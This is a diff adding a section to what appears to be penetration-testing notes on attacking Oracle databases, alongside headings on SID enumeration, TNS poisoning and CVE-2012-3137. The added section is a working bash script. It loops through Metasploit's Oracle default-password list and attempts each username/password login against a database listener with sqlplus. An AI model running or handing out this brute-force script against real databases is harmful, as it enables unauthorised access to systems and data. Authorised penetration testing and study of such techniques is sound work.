@@ -8,6 +8,24 @@ In general I'd recommend this over trying to get Metasploit up and running.  How
 
 The SID for Oracle identifies the database instance running.  We can use ODAT to enumerate these SID's and find instances to attack.
 
+## Username Brute-force
+
+```
+#!/bin/bash
+INPUT=/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv
+OLDIFS=$IFS
+IFS=,
+[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
+while read comment number username password hash comment
+do
+ echo "string = $username:$password"
+ /usr/lib/oracle/12.2/client64/bin/sqlplus -L $username\/$password\@192.168.0.5:1521\/ORCL | cut -d$'\n' -f 7 
+done < $INPUT
+IFS=$OLDIFS 
+```
+
+**Source**: [http://carnal0wnage.attackresearch.com/2014/10/quick-and-dirty-oracle-brute-forcing.html](http://carnal0wnage.attackresearch.com/2014/10/quick-and-dirty-oracle-brute-forcing.html)
+
 ## TNS Poisoning
 
 ## CVE-2012-3137
